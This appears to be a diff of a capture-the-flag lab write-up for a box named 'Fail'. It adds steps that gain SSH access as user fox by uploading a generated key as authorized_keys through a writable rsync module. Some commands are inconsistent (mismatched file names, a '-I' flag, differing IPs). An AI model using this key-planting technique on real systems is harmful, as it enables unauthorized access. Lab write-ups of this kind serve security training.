@@ -82,11 +82,32 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221015222900.png)
 
 
+#### Then copied all rsync files to kali machine
+
 ---
 
 # Exploitation
 ## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### -Typed the following commands to create an authorized_keys file in fox's home directory so I can log in via SSH session:
+-"mkdir fox" 
+-"cd fox"
+-"mkdir .ssh"
+-"cd .ssh" 
+-"touch id_rsa.pub" 
+-"ssh-keygen -t rsa" 
+-[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
+-[Enter passphrase (empty for no passphrase):] "password"
+-[Enter same passphrase again:] "password"
+-"sudo mv id_rsa_pub authorized_keys"
+-"cd .."
+-"rsync -avp fox/ fox@192.168.120.149::fox/"
+
+#### -Navigated to directory where the "id_rsa" file was created after running "ssh-keygen -t rsa" and typed "chmod 600" to create the correct permissions for the private ssh key
+
+#### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox
+
+
 
 ---
 
